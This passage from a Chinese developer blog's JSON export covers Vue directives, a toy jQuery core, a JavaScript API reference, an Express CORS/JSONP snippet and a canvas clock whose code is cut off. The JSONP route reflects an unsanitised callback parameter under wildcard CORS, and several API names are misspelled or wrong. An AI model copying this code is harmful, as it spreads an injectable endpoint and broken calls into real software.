object\"&gt;&lt;/div&gt;&lt;div v-for=\"item in items\" :key=\"item.id\"&gt; &#123;&#123; item.text &#125;&#125;&lt;/div&gt; 如果我们希望每次循环生成两个tr标签呢？如果还有生成其他的标签呢？Vue给我们提供了template标签，供我们用于v-for循环中进行处理。 1234567&lt;ul&gt; &lt;!-- 通过template标签，可以一次循环，输出两个li标签 --&gt; &lt;template v-for=\"item in items\"&gt; &lt;li&gt;&#123;&#123; item.msg &#125;&#125;&lt;/li&gt; &lt;li class=\"divider\"&gt;&lt;/li&gt; &lt;/template&gt;&lt;/ul&gt; 一般作为列表渲染 注意:key是保证数据的唯一性 不写不会报错但是会出现警告 v-on 内联的方式绑定的事件，只能处理简单的事件的处理逻辑。复杂的情况还是封装到js中最方便，也不容易出错。Vue对象中可以添加methods属性，开发者可以把事件处理函数的逻辑放到methods中。 1234567891011121314151617181920&lt;body&gt; &lt;div id=\"app\"&gt; &lt;p&gt;&#123;&#123; number &#125;&#125;&lt;/p&gt; &lt;input type=\"button\" name=\"btnGetNumber\" value=\"增加[绑定事件处理器]\" v-on:click=\"getNumber\"&gt; &lt;input type=\"button\" name=\"btnGetNumber\" value=\"增加[内联方法调用]\" v-on:click=\"getNumber()\"&gt; &lt;/div&gt; &lt;script&gt; var app = new Vue(&#123; el: '#app', data: &#123; number: 1 &#125;, methods: &#123; // 事件响应方法的逻辑代码 getNumber: function (e) &#123; this.number += 1; // 不管是内联方法调用，还是绑定事件处理器两种方式执行事件响应方法的时候 this都是指向 app &#125; &#125; &#125;); &lt;/script&gt; 在事件处理程序中调用 event.preventDefault() 或 event.stopPropagation() 是非常常见的需求。尽管我们可以在 methods 中轻松实现这点，但更好的方式是：methods 只有纯粹的数据逻辑，而不是去处理 DOM 事件细节。为了解决这个问题， Vue.js 为 v-on 提供了 事件修饰符。通过由点(.)表示的指令后缀来调用修饰符。 123456789101112131415161718&lt;!-- 方法处理器 --&gt;&lt;button v-on:click=\"doThis\"&gt;&lt;/button&gt;&lt;!-- 内联语句 --&gt;&lt;button v-on:click=\"doThat('hello', $event)\"&gt;&lt;/button&gt;&lt;!-- 缩写 --&gt;&lt;button @click=\"doThis\"&gt;&lt;/button&gt;&lt;!-- 停止冒泡 --&gt;&lt;button @click.stop=\"doThis\"&gt;&lt;/button&gt;&lt;!-- 阻止默认行为 --&gt;&lt;button @click.prevent=\"doThis\"&gt;&lt;/button&gt;&lt;!-- 阻止默认行为，没有表达式 --&gt;&lt;form @submit.prevent&gt;&lt;/form&gt;&lt;!-- 串联修饰符 --&gt;&lt;button @click.stop.prevent=\"doThis\"&gt;&lt;/button&gt;&lt;!-- 键修饰符，键别名 --&gt;&lt;input @keyup.enter=\"onEnter\"&gt; &lt;!-- 键修饰符，键代码 --&gt;&lt;input @keyup.13=\"onEnter\"&gt; 像ctrl不能直接写键名字 需要keycode .stop - 调用 event.stopPropagation()。 .prevent - 调用 event.preventDefault()。 .capture - 添加事件侦听器时使用 capture 模式。 .self - 只当事件是从侦听器绑定的元素本身触发时才触发回调。 .{keyCode | keyAlias} - 只当事件是从侦听器绑定的元素本身触发时才触发回调。 .native - 监听组件根元素的原生事件。 v-bind 123456&lt;!-- 绑定一个属性 --&gt;&lt;img v-bind:src=\"imageSrc\"&gt;&lt;!-- 缩写 --&gt;&lt;img :src=\"imageSrc\"&gt; &lt;div :class=\" 'color': isRed \"&gt;&lt;/div&gt; &lt;-- color是写死的 isred为变量--&gt;&lt;div :style=\"&#123; fontSize: size + 'px' &#125;\"&gt;&lt;/div&gt; 作用绑定数据的 v-model 限制： input select textarea 作用于表单标签 在表单控件或者组件上创建双向绑定 获取元素节点 vue2.0废除了v-el指令，所有的节点指令修改为ref，然后通过ref来获取元素节点，如 123&lt;div ref=\"testHook\"&gt;test&lt;/div&gt;...js codethis.$ref.testHook 自定义指令 123456789101112Vue.directive('red',(color = 'red')&#123; //er6 语法 如果color没值就把\"red\"赋过去 this.el.style.background = color; &#125;); window.onload=()=&gt;&#123; var vm=new Vue(&#123; el:'#app', data:&#123; msg:'welcome' &#125; &#125;); &#125;; 12345&lt;div id=\"app\"&gt; &lt;span v-red&gt; 字体颜色变化 &lt;/span&gt; &lt;/div&gt;","comments":true,"tags":[{"name":"Vue","slug":"Vue","permalink":"http://www.wanyifeng.top/tags/Vue/"}]},{"title":"jQuery核心代码","date":"2016-11-14T09:12:21.000Z","path":"2016/11/14/jQuery核心代码/","text":"实现代码123456789101112131415161718192021(function()&#123; function item (selector)&#123; return new item.prototype.init(selector); &#125; item.prototype = &#123; constructor:item, length:0, init:function(selector)&#123; var ele = document.querySelectorAll(selector); for (var i = 0;i&lt;ele.length;i++) &#123; this[this.length++] = ele[i]; &#125; &#125;, &#125; item.fn = item.prototype.init.prototype = item.prototype; window.$ = window.jQuery = item;&#125;)();//添加方法$.fn.abc = function()&#123; console.log(\"aa\");&#125;","comments":true,"tags":[{"name":"jQuery","slug":"jQuery","permalink":"http://www.wanyifeng.top/tags/jQuery/"}]},{"title":"JavaScript API 合集","date":"2016-11-09T02:13:21.000Z","path":"2016/11/09/JavaScript API 合集/","text":"今天在掘金上看到了这篇文章，感觉挺不错的，然后收集下来，以供以后进行查阅，再次感谢大神总结的API文档 一、节点 1.1 节点属性 1234567891011121314151617181920Node.nodeName //返回节点名称，只读Node.nodeType //返回节点类型的常数值，只读Node.nodeValue //返回Text或Comment节点的文本值，只读Node.textContent //返回当前节点和它的所有后代节点的文本内容，可读写Node.baseURI //返回当前网页的绝对路径Node.ownerDocument //返回当前节点所在的顶层文档对象，即documentNode.nextSibling //返回紧跟在当前节点后面的第一个兄弟节点Node.previousSibling //返回当前节点前面的、距离最近的一个兄弟节点Node.parentNode //返回当前节点的父节点Node.parentElement //返回当前节点的父Element节点Node.childNodes //返回当前节点的所有子节点Node.firstChild //返回当前节点的第一个子节点Node.lastChild //返回当前节点的最后一个子节点//parentNode接口Node.children //返回指定节点的所有Element子节点Node.firstElementChild //返回当前节点的第一个Element子节点Node.lastElementChild //返回当前节点的最后一个Element子节点Node.childElementCount //返回当前节点所有Element子节点的数目。 1.2 操作 12345678910111213141516Node.appendChild(node) //向节点添加最后一个子节点Node.hasChildNodes() //返回布尔值，表示当前节点是否有子节点Node.cloneNode(true); // 默认为false(克隆节点), true(克隆节点及其属性，以及后代)Node.insertBefore(newNode,oldNode) // 在指定子节点之前插入新的子节点Node.removeChild(node) //删除节点，在要删除节点的父节点上操作Node.replaceChild(newChild,oldChild) //替换节点Node.contains(node) //返回一个布尔值，表示参数节点是否为当前节点的后代节点。Node.compareDocumentPosition(node) //返回一个7个比特位的二进制值，表示参数节点和当前节点的关系Node.isEqualNode(noe) //返回布尔值，用于检查两个节点是否相等。所谓相等的节点，指的是两个节点的类型相同、属性相同、子节点相同。Node.normalize() //用于清理当前节点内部的所有Text节点。它会去除空的文本节点，并且将毗邻的文本节点合并成一个。//ChildNode接口Node.remove() //用于删除当前节点Node.before() //Node.after()Node.replaceWith() 1.3 Document节点 1.3.1 Document节点的属性 12345678910111213141516171819202122232425262728document.doctype //document.documentElement //返回当前文档的根节点document.defaultView //返回document对象所在的window对象document.body //返回当前文档的&lt;body&gt;节点document.head //返回当前文档的&lt;head&gt;节点document.activeElement //返回当前文档中获得焦点的那个元素。//节点集合属性document.links //返回当前文档的所有a元素document.forms //返回页面中所有表单元素document.images //返回页面中所有图片元素document.embeds //返回网页中所有嵌入对象document.scripts //返回当前文档的所有脚本document.styleSheets //返回当前网页的所有样式表//文档信息属性document.documentURI //表示当前文档的网址document.URL //返回当前文档的网址document.domain //返回当前文档的域名document.lastModified //返回当前文档最后修改的时间戳document.location //返回location对象，提供当前文档的URL信息document.referrer //返回当前文档的访问来源document.title //返回当前文档的标题document.characterSet属性返回渲染当前文档的字符集，比如UTF-8、ISO-8859-1。document.readyState //返回当前文档的状态document.designMode //控制当前文档是否可编辑，可读写document.compatMode //返回浏览器处理文档的模式document.cookie //用来操作Cookie 1.3.2 Document节点的方法 （1）读写方法 1234document.open() //用于新建并打开一个文档document.close() //不安比open方法所新建的文档document.write() //用于向当前文档写入内容document.writeIn() //用于向当前文档写入内容，尾部添加换行符。 （2）查找节点 1234567document.querySelector(selectors) //接受一个CSS选择器作为参数，返回第一个匹配该选择器的元素节点。document.querySelectorAll(selectors) //接受一个CSS选择器作为参数，返回所有匹配该选择器的元素节点。document.getElementsByTagName(tagName) //返回所有指定HTML标签的元素document.getElementsByClassName(className) //返回包括了所有class名字符合指定条件的元素document.getElementsByName(name) //用于选择拥有name属性的HTML元素（比如&lt;form&gt;、&lt;radio&gt;、&lt;img&gt;、&lt;frame&gt;、&lt;embed&gt;和&lt;object&gt;等）document.getElementById(id) //返回匹配指定id属性的元素节点。document.elementFromPoint(x,y) //返回位于页面指定位置最上层的Element子节点。 （3）生成节点 1234document.createElement(tagName) //用来生成HTML元素节点。document.createTextNode(text) //用来生成文本节点document.createAttribute(name) //生成一个新的属性对象节点，并返回它。document.createDocumentFragment() //生成一个DocumentFragment对象 （4）事件方法 1234document.createEvent(type) //生成一个事件对象，该对象能被element.dispatchEvent()方法使用document.addEventListener(type,listener,capture) //注册事件document.removeEventListener(type,listener,capture) //注销事件document.dispatchEvent(event) //触发事件 （5）其他 123document.hasFocus() //返回一个布尔值，表示当前文档之中是否有元素被激活或获得焦点。document.adoptNode(externalNode) //将某个节点，从其原来所在的文档移除，插入当前文档，并返回插入后的新节点。document.importNode(externalNode, deep) //从外部文档拷贝指定节点，插入当前文档。 1.4 Element节点 1.4.1 Element节点的属性 （1）特性属性 12345678Element.attributes //返回当前元素节点的所有属性节点Element.id //返回指定元素的id属性，可读写Element.tagName //返回指定元素的大写标签名Element.innerHTML //返回该元素包含的HTML代码，可读写Element.outerHTML //返回指定元素节点的所有HTML代码，包括它自身和包含的的所有子元素，可读写Element.className //返回当前元素的class属性，可读写Element.classList //返回当前元素节点的所有class集合Element.dataset //返回元素节点中所有的data-*属性。 （2）尺寸属性 12345678910111213Element.clientHeight //返回元素节点可见部分的高度Element.clientWidth //返回元素节点可见部分的宽度Element.clientLeft //返回元素节点左边框的宽度Element.clientTop //返回元素节点顶部边框的宽度Element.scrollHeight //返回元素节点的总高度Element.scrollWidth //返回元素节点的总宽度Element.scrollLeft //返回元素节点的水平滚动条向右滚动的像素数值,通过设置这个属性可以改变元素的滚动位置Element.scrollTop //返回元素节点的垂直滚动向下滚动的像素数值Element.offsetHeight //返回元素的垂直高度(包含border,padding)Element.offsetWidth //返回元素的水平宽度(包含border,padding)Element.offsetLeft //返回当前元素左上角相对于Element.offsetParent节点的垂直偏移Element.offsetTop //返回水平位移Element.style //返回元素节点的行内样式 （3）节点相关属性 1234567Element.children //包括当前元素节点的所有子元素Element.childElementCount //返回当前元素节点包含的子HTML元素节点的个数Element.firstElementChild //返回当前节点的第一个Element子节点 Element.lastElementChild //返回当前节点的最后一个Element子节点 Element.nextElementSibling //返回当前元素节点的下一个兄弟HTML元素节点Element.previousElementSibling //返回当前元素节点的前一个兄弟HTML节点Element.offsetParent //返回当前元素节点的最靠近的、并且CSS的position属性不等于static的父元素。 1.4.2 Element节点的方法 （1）位置方法 1234567891011121314151617getBoundingClientRect() // getBoundingClientRect返回一个对象，包含top,left,right,bottom,width,height // width、height 元素自身宽高// top 元素上外边界距窗口最上面的距离// right 元素右外边界距窗口最上面的距离// bottom 元素下外边界距窗口最上面的距离// left 元素左外边界距窗口最上面的距离// width 元素自身宽(包含border,padding) // height 元素自身高(包含border,padding) getClientRects() //返回当前元素在页面上形参的所有矩形。// 元素在页面上的偏移量 var rect = el.getBoundingClientRect() return &#123; top: rect.top + document.body.scrollTop, left: rect.left + document.body.scrollLeft &#125; （2）属性方法 1234Element.getAttribute()：读取指定属性 Element.setAttribute()：设置指定属性 Element.hasAttribute()：返回一个布尔值，表示当前元素节点是否有指定的属性 Element.removeAttribute()：移除指定属性 （3）查找方法 1234Element.querySelector() Element.querySelectorAll() Element.getElementsByTagName() Element.getElementsByClassName() （4）事件方法 1234567891011121314151617181920Element.addEventListener()：添加事件的回调函数 Element.removeEventListener()：移除事件监听函数 Element.dispatchEvent()：触发事件//ie8Element.attachEvent(oneventName,listener)Element.detachEvent(oneventName,listener)// event对象 var event = window.event||event; // 事件的目标节点 var target = event.target || event.srcElement;// 事件代理 ul.addEventListener('click', function(event) &#123; if (event.target.tagName.toLowerCase() === 'li') &#123; console.log(event.target.innerHTML) &#125; &#125;); （5）其他 1234567891011Element.scrollIntoView() //滚动当前元素，进入浏览器的可见区域//解析HTML字符串，然后将生成的节点插入DOM树的指定位置。Element.insertAdjacentHTML(where, htmlString); Element.insertAdjacentHTML('beforeBegin', htmlString); // 在该元素前插入 Element.insertAdjacentHTML('afterBegin', htmlString); // 在该元素第一个子元素前插入 Element.insertAdjacentHTML('beforeEnd', htmlString); // 在该元素最后一个子元素后面插入 Element.insertAdjacentHTML('afterEnd', htmlString); // 在该元素后插入Element.remove() //用于将当前元素节点从DOM中移除Element.focus() //用于将当前页面的焦点，转移到指定元素上 二、CSS操作 （1）类名操作 12345678910111213141516171819//ie8以下Element.className //获取元素节点的类名Element.className += ' ' + newClassName //新增一个类名//判断是否有某个类名function hasClass(element,className)&#123; return new RegExp(className,'gi').test(element.className);&#125;//移除classfunction removeClass(element,className)&#123; element.className = element.className.replace(new RegExp('(^|\\\\b)' + className.split(' ').join('|') + '(\\\\b|$)', 'gi'),'');&#125;//ie10 element.classList.add(className) //新增element.classList.remove(className) //删除element.classList.contains(className) //是否包含element.classList.toggle(className) //toggle class （2）style操作 1234567891011121314151617element.setAttribute('style','')element.style.backgroundColor = 'red'element.style.cssText //用来读写或删除整个style属性element.style.setProperty(propertyName,value) //设置css属性element.style.getPropertyValue(property) //获取css属性element.style.removeProperty(property) //删除css属性操作非内联样式//ie8element.currentStyle[attrName]//ie9+window.getComputedStyle(el,null)[attrName] window.getComputedStyle(el,null).getPropertyValue(attrName)//伪类window.getComputedStyle(el,':after')[attrName] 三、对象 3.1 Object对象 （1）生成实例对象 1var o = new Object() （2）属性 1Object.prototype //返回原型对象 （3）方法 12Object.keys(o) //遍历对象的可枚举属性Object.getOwnPropertyName(o) //遍历对象不可枚举的属性 对象实例的方法 123456valueOf()：返回当前对象对应的值。 toString()：返回当前对象对应的字符串形式。 toLocaleString()：返回当前对象对应的本地字符串形式。 hasOwnProperty()：判断某个属性是否为当前对象自身的属性，还是继承自原型对象的属性。 isPrototypeOf()：判断当前对象是否为另一个对象的原型。propertyIsEnumerable()：判断某个属性是否可枚举。 3.2 Array对象 （1）生成实例对象 1var a = new Array() （2）属性 1a.length //长度 （3）Array.isArray() 1Array.isArray(a) //用来判断一个值是否为数组 （4）Array实例的方法 12345678910111213141516171819202122a.valueof() //返回数组本身a.toString() //返回数组的字符串形式a.push(value,vlaue....) //用于在数组的末端添加一个或多个元素，并返回添加新元素后的数组长度。pop() //用于删除数组的最后一个元素，并返回该元素join() //以参数作为分隔符，将所有数组成员组成一个字符串返回。如果不提供参数，默认用逗号分隔。concat() //用于多个数组的合并。它将新数组的成员，添加到原数组的尾部，然后返回一个新数组，原数组不变。shift() //用于删除数组的第一个元素，并返回该元素。unshift(value) //用于在数组的第一个位置添加元素，并返回添加新元素后的数组长度。reverse() //用于颠倒数组中元素的顺序，返回改变后的数组slice(start_index, upto_index); //用于提取原数组的一部分，返回一个新数组，原数组不变。第一个参数为起始位置（从0开始），第二个参数为终止位置（但该位置的元素本身不包括在内）。如果省略第二个参数，则一直返回到原数组的最后一个成员。负数表示倒数第几个。splice(index, count_to_remove, addElement1, addElement2, ...); //用于删除原数组的一部分成员，并可以在被删除的位置添加入新的数组成员，返回值是被删除的元素。第一个参数是删除的起始位置，第二个参数是被删除的元素个数。如果后面还有更多的参数，则表示这些就是要被插入数组的新元素。sort() //对数组成员进行排序，默认是按照字典顺序排序。排序后，原数组将被改变。如果想让sort方法按照自定义方式排序，可以传入一个函数作为参数，表示按照自定义方法进行排序。该函数本身又接受两个参数，表示进行比较的两个元素。如果返回值大于0，表示第一个元素排在第二个元素后面；其他情况下，都是第一个元素排在第二个元素前面。map() //对数组的所有成员依次调用一个函数，根据函数结果返回一个新数组。map(elem,index,arr) //map方法接受一个函数作为参数。该函数调用时，map方法会将其传入三个参数，分别是当前成员、当前位置和数组本身。forEach() //遍历数组的所有成员，执行某种操作,参数是一个函数。它接受三个参数，分别是当前位置的值、当前位置的编号和整个数组。filter() //参数是一个函数，所有数组成员依次执行该函数，返回结果为true的成员组成一个新数组返回。该方法不会改变原数组。some() //用来判断数组成员是否符合某种条件。接受一个函数作为参数，所有数组成员依次执行该函数，返回一个布尔值。该函数接受三个参数，依次是当前位置的成员、当前位置的序号和整个数组。只要有一个数组成员的返回值是true，则整个some方法的返回值就是true，否则false。every() //用来判断数组成员是否符合某种条件。接受一个函数作为参数，所有数组成员依次执行该函数，返回一个布尔值。该函数接受三个参数，依次是当前位置的成员、当前位置的序号和整个数组。所有数组成员的返回值都是true，才返回true，否则false。reduce() //依次处理数组的每个成员，最终累计为一个值。从左到右处理（从第一个成员到最后一个成员）reduceRight() //依次处理数组的每个成员，最终累计为一个值。从右到左（从最后一个成员到第一个成员）indexOf(s) //返回给定元素在数组中第一次出现的位置，如果没有出现则返回-1。可以接受第二个参数，表示搜索的开始位置lastIndexOf() //返回给定元素在数组中最后一次出现的位置，如果没有出现则返回-1。 3.3 Number对象 （1）生成对象 1var n = new Number() （2）Number对象的属性 1234567Number.POSITIVE_INFINITY：正的无限，指向Infinity。 Number.NEGATIVE_INFINITY：负的无限，指向-Infinity。 Number.NaN：表示非数值，指向NaN。 Number.MAX_VALUE：表示最大的正数，相应的，最小的负数为-Number.MAX_VALUE。 Number.MIN_VALUE：表示最小的正数（即最接近0的正数，在64位浮点数体系中为5e-324），相应的，最接近0的负数为-Number.MIN_VALUE。 Number.MAX_SAFE_INTEGER：表示能够精确表示的最大整数，即9007199254740991。 Number.MIN_SAFE_INTEGER：表示能够精确表示的最小整数，即-9007199254740991。 （4）Number对象实例的方法 1234toString() //用来将一个数值转为字符串形式.可以接受一个参数，表示输出的进制。如果省略这个参数，默认将数值先转为十进制，再输出字符串；否则，就根据参数指定的进制，将一个数字转化成某个进制的字符串。toFixed() //用于将一个数转为指定位数的小数，返回这个小数对应的字符串。toExponential() //用于将一个数转为科学计数法形式。可传入一个参数，参数表示小数点后有效数字的位数，范围为0到20，超出这个范围，会抛出一个RangeError。toPrecision() //用于将一个数转为指定位数的有效数字。 3.4 String 对象 （1）生成实例对象 1var s = new String() （2）String对象的属性 1s.length //返回字符串的长度 （3）方法 1234567891011121314151617s.chatAt(index) //返回指定位置的字符s.fromCharCode() //该方法的参数是一系列Unicode码点，返回对应的字符串。s.charCodeAt(index) //返回给定位置字符的Unicode码点（十进制表示）s.concat(s2) //用于连接两个字符串s.slice(start,end) //用于从原字符串取出子字符串并返回，不改变原字符串。第一个参数是子字符串的开始位置，第二个参数是子字符串的结束位置（不含该位置）。如果参数是负值，表示从结尾开始倒数计算的位置，即该负值加上字符串长度。s.substring(start,end) //用于从原字符串取出子字符串并返回，不改变原字符串.第一个参数表示子字符串的开始位置，第二个位置表示结束位置。s.substr(start,length) //用于从原字符串取出子字符串并返回，不改变原字符串。第一个参数是子字符串的开始位置，第二个参数是子字符串的长度。如果第一个参数是负数，表示倒数计算的字符位置。如果第二个参数是负数，将被自动转为0，因此会返回空字符串。s.indexOf(s) //返回给定元素在字符串中第一次出现的位置，如果没有出现则返回-1。可以接受第二个参数，表示搜索的开始位置 s.lastIndexOf() //返回给定元素在字符串中最后一次出现的位置，如果没有出现则返回-1。s.trim() //用于去除字符串两端的空格，返回一个新字符串s.toLowerCase() //用于将一个字符串全部转为小写,返回一个新字符串，不改变原字符串。s.toUpperCase() //全部转为大写s.localeCompare(s2) //用于比较两个字符串。它返回一个整数，如果小于0，表示第一个字符串小于第二个字符串；如果等于0，表示两者相等；如果大于0，表示第一个字符串大于第二个字符串。s.match(regexp) //用于确定原字符串是否匹配某个子字符串，返回一个数组，成员为匹配的第一个字符串。如果没有找到匹配，则返回null。s.search() //返回值为匹配的第一个位置。如果没有找到匹配，则返回-1。s.replace(oldValue,newValue) //用于替换匹配的子字符串，一般情况下只替换第一个匹配（除非使用带有g修饰符的正则表达式）。s.split() //按照给定规则分割字符串，返回一个由分割出来的子字符串组成的数组。还可传入第二个参数，决定了返回数组的成员数。 3.5 Math对象 （1）属性 12345678Math.E：常数e。 Math.LN2：2的自然对数。 Math.LN10：10的自然对数。 Math.LOG2E：以2为底的e的对数。 Math.LOG10E：以10为底的e的对数。 Math.PI：常数Pi。 Math.SQRT1_2：0.5的平方根。 Math.SQRT2：2的平方根。 （2）数学方法 1234567891011Math.abs()：返回参数的绝对值 Math.ceil()：向上取整，接受一个参数，返回大于该参数的最小整数。 Math.floor()：向下取整 Math.max(n,n1,...)：可接受多个参数，返回最大值 Math.min(n,n1,..)：可接受多个参数，返回最小值 Math.pow(n,e)：指数运算, 返回以第一个参数为底数、第二个参数为幂的指数值。 Math.sqrt()：返回参数值的平方根。如果参数是一个负值，则返回NaN。 Math.log()：返回以e为底的自然对数值。Math.exp()：返回e的指数，也就是常数e的参数次方。Math.round()：四舍五入 Math.random()：返回0到1之间的一个伪随机数，可能等于0，但是一定小于1。 （3）三角函数方法 123456Math.sin()：返回参数的正弦 Math.cos()：返回参数的余弦 Math.tan()：返回参数的正切 Math.asin()：返回参数的反正弦（弧度值） Math.acos()：返回参数的反余弦（弧度值） Math.atan()：返回参数的反正切（弧度值） 3.6 JSON对象 （1）方法 123456JSON.stringify() //用于将一个值转为字符串。该字符串应该符合JSON格式，并且可以被JSON.parse方法还原。//（JSON.stringify(obj, selectedProperties)）还可以接受一个数组，作为第二个参数，指定需要转成字符串的属性。//还可以接受第三个参数，用于增加返回的JSON字符串的可读性。如果是数字，表示每个属性前面添加的空格（最多不超过10个）；如果是字符串（不超过10个字符），则该字符串会添加在每行前面。JSON.parse() //用于将JSON字符串转化成对象。 3.7 console对象 （1）方法 1234567891011121314151617181920212223242526console.log(text,text2,...) //用于在console窗口输出信息。它可以接受多个参数，将它们的结果连接起来输出。如果第一个参数是格式字符串（使用了格式占位符），console.log方法将依次用后面的参数替换占位符，然后再进行输出。console.info() //在console窗口输出信息，同时，会在输出信息的前面，加上一个蓝色图标。console.debug() //在console窗口输出信息，同时，会在输出信息的前面，加上一个蓝色图标。console.warn() //输出信息时，在最前面加一个黄色三角，表示警告；console.error() //输出信息时，在最前面加一个红色的叉，表示出错，同时会显示错误发生的堆栈console.table() //可以将复合类型的数据转为表格显示。console.count() //用于计数，输出它被调用了多少次。console.dir() //用来对一个对象进行检查（inspect），并以易于阅读和打印的格式显示。console.dirxml() //用于以目录树的形式，显示DOM节点。console.assert() //接受两个参数，第一个参数是表达式，第二个参数是字符串。只有当第一个参数为false，才会输出第二个参数，否则不会有任何结果。//这两个方法用于计时，可以算出一个操作所花费的准确时间。console.time()console.timeEnd()//time方法表示计时开始，timeEnd方法表示计时结束。它们的参数是计时器的名称。调用timeEnd方法之后，console窗口会显示“计时器名称: 所耗费的时间”。console.profile() //用来新建一个性能测试器（profile），它的参数是性能测试器的名字。console.profileEnd() //用来结束正在运行的性能测试器。console.group()console.groupend()//上面这两个方法用于将显示的信息分组。它只在输出大量信息时有用，分在一组的信息，可以用鼠标折叠/展开。console.groupCollapsed() //用于将显示的信息分组，该组的内容，在第一次显示时是收起的（collapsed），而不是展开的。console.trace() //显示当前执行的代码在堆栈中的调用路径。console.clear() //用于清除当前控制台的所有输出，将光标回置到第一行。","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"}]},{"title":"Node代理实现跨域","date":"2016-11-08T01:38:21.000Z","path":"2016/11/08/代理实现跨域/","text":"1234567891011//将所有api的请求响应content-type设置为application/jsonapp.all('/api/*',(req,res,next)=&gt;&#123; //设置允许跨域响应报文头 //设置跨域 res.header(\"Access-Control-Allow-Origin\", \"*\"); res.header(\"Access-Control-Allow-Headers\", \"X-Requested-With\"); res.header(\"Access-Control-Allow-Methods\",\"*\"); res.setHeader('Content-Type','application/json;charset=utf-8'); next();&#125;); 支持jsonp 1234567route.all('/api/jsonp',(req,res)=&gt;&#123; var callbackFn = req.query.callback; var obj = &#123;message:'jsonp 请求 ok'&#125;; var jsonStr = JSON.stringify(obj); res.end(`$&#123;callbackFn&#125;('$&#123;jsonStr&#125;')`);&#125;); 以上基于express 框架实现","comments":true,"tags":[{"name":"node","slug":"node","permalink":"http://www.wanyifeng.top/tags/node/"}]},{"title":"基于canvas的时钟实现代码","date":"2016-11-05T10:33:21.000Z","path":"2016/11/05/基于canvas的时钟实现代码/","text":"12345678910111213&lt;script src=\"js/time.js\" type=\"text/javascript\" charset=\"utf-8\"&gt;&lt;/script&gt; &lt;script type=\"text/javascript\"&gt; var canvas = document.querySelector(\"canvas\"); function timeInit (data)&#123; new Time(data); &#125; timeInit(&#123; canvas:canvas, bigRoundX:300, bigRoundY:300, bigRoundR:150 &#125;); &lt;/script&gt; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244function Time(data) &#123; //设置默认值 this.rester() //设置初始化的值 this.readtData(data) //入口函数 this.init();&#125;Time.prototype = &#123; constructor: Time, //初始值 rester: function() &#123; this.startRadian = -Math.PI / 2; this.endRadian = Math.PI * 3 / 2; this.bigRoundColor = \"red\"; this.bigRoundLineWidth = 8; //H时针参数 M分针参数 S秒钟参数 //[0]指针颜色 [1]指针线宽 [2] 指针平头长度 [3] 指针尖头长度 this.Pointer = &#123; H: [\"#000\", 6, 30,30], M: [\"yellow\", 4, 50,25], S: [\"red\", 2, 70,25] &#125; this.dishFontSize = \"20px\"; this.dishFontfamily = \"微软雅黑\"; this.dishBigLineColor = \"#000\"; this.dishBigLineLineWidth = 5; this.dishSmallLineColor = \"#000\"; this.dishSmallLineLineWidth = 2; &#125;, init: function() &#123; //画表盘 this.drawBigRound(); //绘制指针 this.setintvalDrawPointer(); &#125;, /*计算坐标三角函数* * @param &#123;Object&#125; x 起点 * @param &#123;Object&#125; y 起点 * @param &#123;Object&#125; r 半径 * @param &#123;Object&#125; rad 弧度 */ roundPosition: function(x, y, r, rad) &#123; rad += Math.PI; return &#123; endX: Math.sin(rad) * r + x, endY: Math.cos(rad) * r + y, rad: rad &#125; &#125;, drawBigRoundLine: function() &#123; var rad = Math.PI / 30, ctx = this.ctx, i = 0, j = 12, end, st; for(; i &lt; 60; i++) &#123; st = this.roundPosition(this.bigRoundX, this.bigRoundY, this.bigRoundR - this.bigRoundLineWidth / 2, rad * i); if(i % 5 == 0) &#123; end = this.roundPosition(this.bigRoundX, this.bigRoundY, this.bigRoundR - 25, rad * i) //画粗线 this.drawLine(&#123; ctx: ctx, stX: st.endX, stY: st.endY, endX: end.endX, endY: end.endY &#125;) this.washStroke(ctx, this.dishBigLineColor, this.dishBigLineLineWidth) end = this.roundPosition(this.bigRoundX, this.bigRoundY, this.bigRoundR - 40, rad * i) this.drawFillText(&#123; ctx: ctx, text: j--, x: end.endX, y: end.endY, textAlign: \"center\", textBaseline: \"middle\", size: this.dishFontSize, family: this.dishFontfamily &#125;) &#125; else &#123; end = this.roundPosition(this.bigRoundX, this.bigRoundY, this.bigRoundR - 12, rad * i) this.drawLine(&#123; ctx: ctx, stX: st.endX, stY: st.endY, endX: end.endX, endY: end.endY &#125;) this.washStroke(ctx, this.dishSmallLineColor, this.dishSmallLineLineWidth) &#125; &#125; &#125;, drawBigRound: function() &#123; var ctx = this.ctx; this.drawbun(&#123; ctx: ctx, x: this.bigRoundX, y: this.bigRoundY, r: this.bigRoundR, startRadian: this.startRadian, endRadian: this.endRadian &#125;); this.washStroke(ctx, this.bigRoundColor, this.bigRoundLineWidth) this.drawBigRoundLine(); &#125;, //初始化数据 readtData: function(data) &#123; if(!data.canvas) &#123; throw new Error(\"canvas没有传递\"); &#125; data.ctx = data.canvas.getContext(\"2d\"); for(var key in data) &#123; this[key] = data[key]; &#125; &#125;, /*画圆* * @param &#123;Object&#125; drawData * ctx:上下文 * x,y 圆心的坐标 * r圆的半径 * 以下可选 * startRadian 开始弧度 默认 0 * endRadian 结束弧度 默认2pi */ drawbun: function(drawData) &#123; var ctx = drawData.ctx; ctx.beginPath(); ctx.arc(drawData.x, drawData.y, drawData.r, drawData.startRadian || 0, drawData.endRadian || 2 * Math.PI); &#125;, setintvalDrawPointer: function() &#123; var time = new Date(), H = time.getHours(), M = time.getMinutes(), S = time.getSeconds(), this_ = this, ctx = this_.ctx, stX = this_.bigRoundX, stY = this_.bigRoundY, Pointer = this_.Pointer, AMandPM = parseInt(H / 12), timeArr = [H % 12, M, S, AMandPM]; (function() &#123; this_.drawPointer(&#123; ctx: ctx, stX: stX, stY: stY, timeArr: timeArr, Pointer: Pointer &#125;) &#125;)() setInterval(function() &#123; this_.ctx.clearRect(0, 0, canvas.width, canvas.height) var time = new Date(), H = time.getHours(), M = time.getMinutes(), S = time.getSeconds(), AMandPM = parseInt(H / 12); this_.drawPointer(&#123; ctx: ctx, stX: stX, stY: stY, timeArr: [H % 12, M, S, AMandPM], Pointer: Pointer &#125;) this_.drawBigRound(); &#125;, 1000) &#125;, //画指针 drawPointer: function(drawData) &#123; //画线 var ctx = drawData.ctx, stX = drawData.stX, timeArr = drawData.timeArr, stY = 